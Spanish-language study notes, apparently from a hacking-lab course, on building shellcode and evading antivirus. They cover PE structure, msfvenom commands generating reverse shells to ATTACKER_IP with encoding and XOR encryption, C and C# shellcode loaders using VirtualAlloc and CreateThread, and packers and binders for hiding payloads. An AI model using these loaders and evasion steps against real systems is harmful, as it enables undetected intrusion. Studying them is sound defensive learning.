# Objetivos

- Aprender como se hacen las shellcodes
- Explorar los pros y contras de pasos a payloads
- Crear shellcodes sileciosos para no ser detectados por AV

# Retos

EN este reto, prepararemos una máquina Windows con una aplicación web en la que podamos subir nuestros payloads. Una vez subidos, esos payloads se checkearan en un AV y se jeecutaran si se encuentra malware. 

![image](https://github.com/user-attachments/assets/281d3892-1e85-485f-9e1d-f22c399338a3)

# Estructua PE

El formato ejecutable de Windows, PE (Portable Executable), es una estructua de datos que aguarda la información necesarioa de los archivos. Esta es la forma de organizar arhcivos ejecutables del archivo a un disco. 

En general, la estructura de archivos de windows normalmente son binarios como eXE, DLL y objetos, que tienen la misma estructura y funcionamiento que estas.

Una PE contiene varias secciones que guardan infgomraci`´on sobre un binario, como metadatos links a la memoria librerias externas. etc

![image](https://github.com/user-attachments/assets/ad7dcb46-6525-4158-b8f5-2851e0f3b75c)

1. .text guarda el codigo del programa
2. .data define las variables
3. .bss aguanta los datos iniciales
4. .rdata contiene los datos de lectura
5. .edata continee los objetos exportables e información de la tabla
6. .idata objetos importables y información
7. .reloc recoloca la información de la imagen
8. .rsrc recrusos externos

Divididos:

1. Sección de cabecera: DOS, Windows y cabeceras opcionales que dan información sobre el archivo EXE. Por ejemplo:

- Los números mágicos empiezan con "MZ", diciendo que es un archivo ejecutable
- Las firmas del archivo
- Fechas de reación, archivo de compilación...

2. Analizar la sección de los detalles de tabla, como el numero des ecciónes que ocntinee un archivo
3. Mappea el contenido de larchivo dentro de la memoria.
4. Importa, DLLs, y otros objetos que deben ser cargados en la memoria
5. La dirección "EntryPoint" esta localizada en el lugar mas importante donde se ejecuta la funcion.


## Porque necesitamos saber sobre PE?

- Para crear o modificar malware con la AV evasión, necesitamos entender la estructura de un PE (Windows Portable Executable) y donde se guardan los shellcodes.
- Podemos controlar los datos de sección y definir la variable de la shell.

## PE-BEAR

Hay una aplicación llamada "PE-BEAR" nos ayudara a ver la estructura de un portable, cabeeceras, secciónes etc.

![image](https://github.com/user-attachments/assets/35dffce0-1541-4337-9eb7-d8d4f60bc8fe)

Una vez cargemos un archivo, podemos ver los detalles

![image](https://github.com/user-attachments/assets/88c5131e-fd83-4499-bcdd-9e83cefce8b2)

# Introducción al ShellCode

Shellcode es una set de instrucciones de código a una máquina para decirle al programa vulnerable para ejecutar funciones que no haria de normal.

Una vez la shell es injectada dentro del proceso y se ejecuta la el programa, podemos modificar el código  para actualizar registros.

En general estan escritos en lenguaje ensamblador y traducido en hexadecimal

Para craftear un shellcode:

- Entender arquitecturas CPU x64 y x86
- Lenguaje Ensamblador
- Saber lenguajes como C
- Familiarizado con Linux o sitemas operativos Windows

Para generar nuestro shellcode, necesitaremos escribir y extraer bytes de una máquina. 

Para llamar a las funciones, necesitaremos usar las "syscalls". Es la forma que un programa consulta al kernel lo que tiene que hacer. En este caso, nosotros queremos que escribir en nuestr página, y que salga en el programa. Esta operación tiene que ser diferente, vamos a escribirlo para Linux

![image](https://github.com/user-attachments/assets/97b6a569-b611-4661-a987-4227be67fe01)


La tablaa anteiror nos dice los valores que nosotros necesitamos para los diferentes procesos y registros usando las funciones "sys_write" y "sys_exit". 

```
global _start

section .text
_start:
    jmp MESSAGE      ; 1) let's jump to MESSAGE

GOBACK:
    mov rax, 0x1
    mov rdi, 0x1
    pop rsi          ; 3) we are popping into `rsi`; now we have the
                     ; address of "THM, Rocks!\r\n"
    mov rdx, 0xd
    syscall

    mov rax, 0x3c
    mov rdi, 0x0
    syscall

MESSAGE:
    call GOBACK       ; 2) we are going back, since we used `call`, that means
                      ; the return address, which is, in this case, the address
                      ; of "THM, Rocks!\r\n", is pushed into the stack.
    db "THM, Rocks!", 0dh, 0ah
```

Vamos a explicar el código:

Primero el mensaje se guarda en el final de la sección .text. Una ves necesitamos apuntar el mensaje que queremos mandar, saltamos y llamamos a la instrucción antes del mensaje. Cuando "call GOBACK" se ejecuta, la dirección de la siguiente instrucción llamada y la utiliza. Corresponde a cuanto nuestro mensjae. 

El programa empieza con la rutina GOBACK y se prepara para los registros que nostoros queramos "sys_write"

```
user@AttackBox$ nasm -f elf64 thm.asm
user@AttackBox$ ld thm.o -o thm
user@AttackBox$ ./thm
THM,Rocks!
```

Usamos "nasm" para compilar el archivo asm, especificando la flag "-f elf64" para indicar que lo queremos compilar en 64-bits. Obtenemos un archivo .o, que contiene el código, si necesitamos linkar y ordenar el ejecutable, utilizaremos el comando ld para qeu sea un ejecutable. la opción -o es para el output

Ahora vamos a complar el programa,  yesctraer el shell code con el comando "objdump"

```
user@AttackBox$ objdump -d thm

thm:     file format elf64-x86-64


Disassembly of section .text:

0000000000400080 <_start>:
  400080:	eb 1e                	jmp    4000a0 

0000000000400082 :
  400082:	b8 01 00 00 00       	mov    $0x1,%eax
  400087:	bf 01 00 00 00       	mov    $0x1,%edi
  40008c:	5e                   	pop    %rsi
  40008d:	ba 0d 00 00 00       	mov    $0xd,%edx
  400092:	0f 05                	syscall 
  400094:	b8 3c 00 00 00       	mov    $0x3c,%eax
  400099:	bf 00 00 00 00       	mov    $0x0,%edi
  40009e:	0f 05                	syscall 

00000000004000a0 :
  4000a0:	e8 dd ff ff ff       	callq  400082 
  4000a5:	54                   	push   %rsp
  4000a6:	48                   	rex.W
  4000a7:	4d 2c 20             	rex.WRB sub $0x20,%al
  4000aa:	52                   	push   %rdx
  4000ab:	6f                   	outsl  %ds:(%rsi),(%dx)
  4000ac:	63 6b 73             	movslq 0x73(%rbx),%ebp
  4000af:	21                   	.byte 0x21
  4000b0:	0d                   	.byte 0xd
  4000b1:	0a                   	.byte 0xa
```

Ahora nosotros necesitamos extraer el avlor hexadecimal. Para hacer esto, necesitaremos usar "objcopy" en la sección .text y llamar al archivo thm.etext

```
user@AttackBox$ objcopy -j .text -O binary thm thm.text
```

EL thm.text contiene nuestro shellcode en formato binario, vamos a habilitarlo, y convertilo en hexadecimal con xxd -i 

```
user@AttackBox$ xxd -i thm.text
unsigned char new_text[] = {
  0xeb, 0x1e, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00,
  0x5e, 0xba, 0x0d, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00,
  0x00, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xdd, 0xff, 0xff,
  0xff, 0x54, 0x48, 0x4d, 0x2c, 0x20, 0x52, 0x6f, 0x63, 0x6b, 0x73, 0x21,
  0x0d, 0x0a
};
unsigned int new_text_len = 50;
```

Finalmente que tenemos el ensamblador, 

```
#include <stdio.h>

int main(int argc, char **argv) {
    unsigned char message[] = {
        0xeb, 0x1e, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00,
        0x5e, 0xba, 0x0d, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00,
        0x00, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xdd, 0xff, 0xff,
        0xff, 0x54, 0x48, 0x4d, 0x2c, 0x20, 0x52, 0x6f, 0x63, 0x6b, 0x73, 0x21,
        0x0d, 0x0a
    };
    
    (*(void(*)())message)();
    return 0;
}
```

Una vez lo tenemos compilado y ejecutamos

```
user@AttackBox$ gcc -g -Wall -z execstack thm.c -o thmx
user@AttackBox$ ./thmx
THM,Rocks!
```

Sabiendo que funciona vamos a probarlo en un antivirus o que.

# Generar una Shellcode

## Generarla usando herramientas Públicas

Los mayores frameworks C2 para nuestro shellcode son compatibles normalmente con la misma plataforma. 

Usaremos Msfvenom para generar un shellcode que se ejecute con los arhcivos de windows. Vamos a crear una shellcode que se llame como la aplicación calc.exe

```
msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f c
No encoder specified, outputting raw payload
Payload size: 193 bytes
Final size of c file: 835 bytes
unsigned char buf[] =
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
```

Como resultado Metasploit genera una shellcde que ejecuta la calculadora de Windows. 

## Shellcode Injection

El código en C que contiene nuestra cacl

```
#include <windows.h>
char stager[] = {
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00" };
int main()
{
        DWORD oldProtect;
        VirtualProtect(stager, sizeof(stager), PAGE_EXECUTE_READ, &oldProtect);
        int (*shellcode)() = (int(*)())(void*)stager;
        shellcode();
}
```

Ahora vamos a compilar el archivo en exe

```
i686-w64-mingw32-gcc calc.c -o calc-MSF.exe
```

Una vez tenemos el archivo exe, vamos a transfeir a una máquina windows y ejceutarla podemos usar smb por ejemlpo

```
smclient -U dominio //ip/ruta
put cal.exe
```

![image](https://github.com/user-attachments/assets/d633d703-90fc-401a-940a-6b87ab0693af)

## Generar una Shellcode con arhivos exe

Las shellcodes normalmente se guardan en archivos .bin, en formato raw, si queremos la shell usaremos xxd -i

```
user@AttackBox$ msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f raw > /tmp/example.bin
No encoder specified, outputting raw payload
Payload size: 193 bytes

user@AttackBox$ file /tmp/example.bin
/tmp/example.bin: data
```

```
user@AttackBox$ xxd -i /tmp/example.bin
unsigned char _tmp_example_bin[] = {
  0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64,
  0x8b, 0x50, 0x30, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28,
  0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c,
  0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf2, 0x52, 0x57, 0x8b, 0x52,
  0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 0xe3, 0x48, 0x01, 0xd1,
  0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3, 0x3a, 0x49,
  0x8b, 0x34, 0x8b, 0x01, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01,
  0xc7, 0x38, 0xe0, 0x75, 0xf6, 0x03, 0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75,
  0xe4, 0x58, 0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b, 0x0c, 0x4b, 0x8b,
  0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24,
  0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x5f, 0x5f, 0x5a,
  0x8b, 0x12, 0xeb, 0x8d, 0x5d, 0x6a, 0x01, 0x8d, 0x85, 0xb2, 0x00, 0x00,
  0x00, 0x50, 0x68, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5,
  0xa2, 0x56, 0x68, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x3c, 0x06, 0x7c,
  0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
  0x00, 0x53, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65,
  0x00
};
unsigned int _tmp_example_bin_len = 193;
```

# Pasos de Payload

Dependiendo el metodo normalmente los payload se categorizan en "staged" o "tageless"

## Stageless

Piensa en un paquete de app que ejecuta un shell y en un solo proceso.

![image](https://github.com/user-attachments/assets/f626ccfa-150f-48d8-886c-b8c4eac5bd9b)

## Staged

Se usa como intermediario. 

![image](https://github.com/user-attachments/assets/3b071538-f6b1-4a85-8137-fd6e46d1acc9)

Una vez recibido, se injecta el shellcode final

![image](https://github.com/user-attachments/assets/3874c841-007a-41d8-ae59-bd8dc81b2a09)

# Encriptar y codificar Shellcodes

## Codificar usando MSFVemos

```
user@AttackBox$ msfvenom --list encoders | grep excellent
    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
```

Podemos indicar que nosotros queremos usar el encoder de "shikata" -e

```
user@AttackBox$ msfvenom -a x86 --platform Windows LHOST=ATTACKER_IP LPORT=443 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f csharp
Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai succeeded with size 395 (iteration=1)
x86/shikata_ga_nai succeeded with size 422 (iteration=2)
x86/shikata_ga_nai chosen with final size 422
Payload size: 422 bytes
Final size of csharp file: 2170 bytes
```

Si queremos subir nuestro archivo generado, vemos simplemente que tiene virus normalmente estos no sirven un a mierda

## Encriptar usando MSFvenomn

```
user@AttackBox$ msfvenom --list encrypt
Framework Encryption Formats [--encrypt <value>]
================================================

    Name
    ----
    aes256
    base64
    rc4
    xor
```

Vamos a utilizarr XOR

```
user@AttackBox$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=7788 -f exe --encrypt xor --encrypt-key "MyZekr3tKey***" -o xored-revshell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
```

Estos simples payloads son muy fáciles de detectar

## Crear un Payload Customizado

El primero paso es analizar nuestro payload, generaremos y combinaremos XOR y base64 para bypassear

```
user@AttackBox$ msfvenom LHOST=ATTACKER_IP LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp
```

### Encoder

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Encrypter
{
    internal class Program
    {
        private static byte[] xor(byte[] shell, byte[] KeyBytes)
        {
            for (int i = 0; i < shell.Length; i++)
            {
                shell[i] ^= KeyBytes[i % KeyBytes.Length];
            }
            return shell;
        }
        static void Main(string[] args)
        {
            //XOR Key - It has to be the same in the Droppr for Decrypting
            string key = "THMK3y123!";

            //Convert Key into bytes
            byte[] keyBytes = Encoding.ASCII.GetBytes(key);

            //Original Shellcode here (csharp format)
            byte[] buf = new byte[460] { 0xfc,0x48,0x83,..,0xda,0xff,0xd5 };

            //XORing byte by byte and saving into a new array of bytes
            byte[] encoded = xor(buf, keyBytes);
            Console.WriteLine(Convert.ToBase64String(encoded));        
        }
    }
}
```

```
C:\> csc.exe Encrypter.cs
C:\> .\Encrypter.exe
qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=
```

## Decodificar

```
using System;
using System.Net;
using System.Text;
using System.Runtime.InteropServices;

public class Program {
  [DllImport("kernel32")]
  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

  [DllImport("kernel32")]
  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

  [DllImport("kernel32")]
  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

  private static UInt32 MEM_COMMIT = 0x1000;
  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
  
  private static byte[] xor(byte[] shell, byte[] KeyBytes)
        {
            for (int i = 0; i < shell.Length; i++)
            {
                shell[i] ^= KeyBytes[i % KeyBytes.Length];
            }
            return shell;
        }
  public static void Main()
  {

    string dataBS64 = "qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=";
    byte[] data = Convert.FromBase64String(dataBS64);

    string key = "THMK3y123!";
    //Convert Key into bytes
    byte[] keyBytes = Encoding.ASCII.GetBytes(key);

    byte[] encoded = xor(data, keyBytes);

    UInt32 codeAddr = VirtualAlloc(0, (UInt32)encoded.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(encoded, 0, (IntPtr)(codeAddr), encoded.Length);

    IntPtr threadHandle = IntPtr.Zero;
    UInt32 threadId = 0;
    IntPtr parameter = IntPtr.Zero;
    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

    WaitForSingleObject(threadHandle, 0xFFFFFFFF);

  }
}
```

```
C:\> csc.exe EncStageless.cs
```

# Packers

Otro metodo para pasar la detección es usar un packer, son piezas de software que inputear y transformar la estrucutra para que se vea diferente

- Comprimen el programa para que pese mentos
- Protegen el programa para una ingenieria reversa

Estos Packers son usados normalmente por desarrolaldores de software para proteger su software de ingenierias reversas. Es un alto nivel de proteccón e implementación transformando y comprimiendo toda la encriptación.

Packers: UPX, MPRESS, Themida

## Packear una aplicación

Mientras cada packer opera diferentes ,vamos a ver un ejemplo

Cuando una aplicación es packeada, se transforma usando fuciones packing. Estas funciones necesitan activar la desofuscación y transformarse en código original para que en la aplicación peuda hacer una función reversa para lo que la función estaba destinada. Mientras aveces los packers añadien el mismo código.


![image](https://github.com/user-attachments/assets/8a1dc624-14c4-4a0c-afb0-69869cf5149e)


![image](https://github.com/user-attachments/assets/149e43bc-7071-4191-b7ee-9d3785052dc3)

# Binders


![image](https://github.com/user-attachments/assets/1a586655-30c8-4a75-b0ac-751c89b341c4)

Un binder es un programa que tiene dos o más ejecutables en uno. Aveces se usa cuando quieres distribuir tu payload oculto dentro de un programa con diferentes usuarios y diferentes programas


